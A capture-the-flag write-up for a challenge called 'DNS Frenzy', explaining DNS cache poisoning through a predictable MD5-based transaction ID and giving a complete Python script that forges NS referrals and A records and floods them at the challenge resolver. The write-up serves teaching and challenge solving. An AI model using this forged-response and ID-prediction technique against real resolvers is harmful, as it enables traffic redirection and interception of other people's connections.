DNS Frenzy

```
🧩 Challenge Overview

We’re given a target DNS server at 34.134.162.213, with two key UDP ports:

17004 – used for DNS queries
17014 – used by the internal resolver to receive replies
```

# Analysis

This challenge is DNS cache poisoning, with the following twist:

1. The server uses a predictable Transaction ID (TID) based on:

```py
TID = struct.unpack("!H", md5(f"{CALLER}_{timestamp}"))[:2]
```
2. The resolver first queries the base domain (dns_l3ak.ctf.itsbengsky.id) and expects an NS referral.
3. If we can respond with an NS record pointing to our server and later respond with a fake A record (with a correct TID), we can trick the resolver into querying us for further records.

Once we poison the DNS resolver’s cache, the target will eventually leak a TXT record from the internal domain by resolving it — revealing the flag.

# Exploitation Steps
1. Predict the TID
Since the server uses:
```py
timestamp = int(time.time()) // 0.2
hash = md5(f"{CALLER}_{timestamp}")
```
We can predict the transaction ID (TID) as long as our clock is synced with the server and we use the correct IP in CALLER.

2. Trigger the Resolver Flow

We send a real query to dns_l3ak.ctf.itsbengsky.id to start the resolution process.

This causes the server to wait for an NS referral.

3. Inject a Forged NS Referral
We respond with:

Authority section: NS xixixi (our fake NS)
Additional section: xixixi A 127.0.0.1 

4. Inject a Fake A Record
Once the resolver believes we're authoritative, it will ask us for A records for subdomains.

We respond with a forged A record for the internal random subdomain.


**We spam this to increase the chance of winning the race condition.**

5. Finally, once the resolver caches our A record, we repeatedly try to resolve TXT records:


solve.py
```py
import hashlib
import struct
import time
import socket
import subprocess
import random

TARGET = "34.134.162.213"
PORT_DNS_QUERY = 17004
PORT_RESOLVER_LISTEN = 17014
CALLER = "YOUR PUBLIC IP ADDRESS"  # Replace with your real IP

INTERNAL_BASE = "dns_l3ak.ctf.itsbengsky.id"
FAKE_NS = "xixixi"
FAKE_NS_IP = "127.0.0.1"

def get_internal_domain():
    return f"{random.randint(1, 99999999)}.{INTERNAL_BASE}"

def get_tid():
    """Predicts TID based on timestamp and caller IP."""
    timestamp = int(time.time()) // 0.2
    data = f"{CALLER}_{timestamp}".encode()
    hash_bytes = hashlib.md5(data).digest()
    tid = struct.unpack("!H", hash_bytes[:2])[0]
    print(f"[+] Predicted TID = {tid} for data = {data}")
    return tid

def encode_qname(domain):
    return b''.join([bytes([len(part)]) + part.encode() for part in domain.split('.')]) + b'\x00'

def build_dns_query(tid, domain):
    header = struct.pack("!H", tid) + b"\x01\x00"  # Standard query
    header += b"\x00\x01" + b"\x00\x00" * 3       # QDCOUNT = 1, others = 0
    qname = encode_qname(domain)
    return header + qname + struct.pack("!HH", 1, 1)  # Type A, Class IN

def build_ns_response(tid, qdomain):
    pkt = struct.pack("!H", tid) + b"\x81\x80"
    pkt += b"\x00\x01"  # QDCOUNT
    pkt += b"\x00\x00"  # ANCOUNT
    pkt += b"\x00\x01"  # NSCOUNT
    pkt += b"\x00\x01"  # ARCOUNT

    pkt += encode_qname(qdomain) + struct.pack("!HH", 1, 1)

    # Authority section (NS record)
    pkt += encode_qname(qdomain)
    pkt += struct.pack("!HHI", 2, 1, 300)  # NS type
    ns_encoded = encode_qname(FAKE_NS)
    pkt += struct.pack("!H", len(ns_encoded)) + ns_encoded

    # Additional section (A record for FAKE_NS)
    pkt += encode_qname(FAKE_NS)
    pkt += struct.pack("!HHI", 1, 1, 300)
    pkt += struct.pack("!H", 4) + socket.inet_aton(FAKE_NS_IP)

    return pkt

def build_final_response(tid, domain):
    pkt = struct.pack("!H", tid) + b"\x81\x80"
    pkt += b"\x00\x01"  # QDCOUNT
    pkt += b"\x00\x01"  # ANCOUNT
    pkt += b"\x00\x00" * 2  # NSCOUNT, ARCOUNT

    pkt += encode_qname(domain) + struct.pack("!HH", 1, 1)

    # Answer section
    pkt += encode_qname(domain)
    pkt += struct.pack("!HHI", 1, 1, 300)
    pkt += struct.pack("!H", 4) + socket.inet_aton("127.0.0.1")

    return pkt

def send_packet(packet, port):
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.sendto(packet, (TARGET, port))

def send_real_query(domain, tid):
    print(f"[+] Sending real DNS query for {domain}")
    send_packet(build_dns_query(tid, domain), PORT_DNS_QUERY)

def send_forged_ns_response(tid, domain):
    print(f"[+] Sending forged NS referral for {domain}")
    send_packet(build_ns_response(tid, domain), PORT_RESOLVER_LISTEN)

def send_forged_final_response(tid, domain):
    print(f"[+] Sending forged A record for {domain}")
    send_packet(build_final_response(tid, domain), PORT_RESOLVER_LISTEN)

def get_txt_flag(domain):
    print(f"[+] Querying TXT record for {domain}")
    try:
        output = subprocess.check_output(
            ["dig", f"@{TARGET}", "-p", str(PORT_DNS_QUERY), domain, "TXT"],
            stderr=subprocess.DEVNULL
        ).decode()
        print("\n[+] DNS TXT Response:\n" + output)
    except subprocess.CalledProcessError:
        print("[-] Failed to get TXT record")

def main():
    internal_domain = get_internal_domain()
    external_domain = INTERNAL_BASE
    tid = get_tid()

    send_real_query(external_domain, tid)

    time.sleep(1.2)
    send_forged_ns_response(tid, external_domain)

    time.sleep(8)
    for _ in range(100):
        send_forged_ns_response(tid, internal_domain)

    time.sleep(2)
    for _ in range(100):
        send_forged_final_response(tid, internal_domain)

    for _ in range(50):
        time.sleep(1)
        get_txt_flag(internal_domain)

if __name__ == "__main__":
    main()
```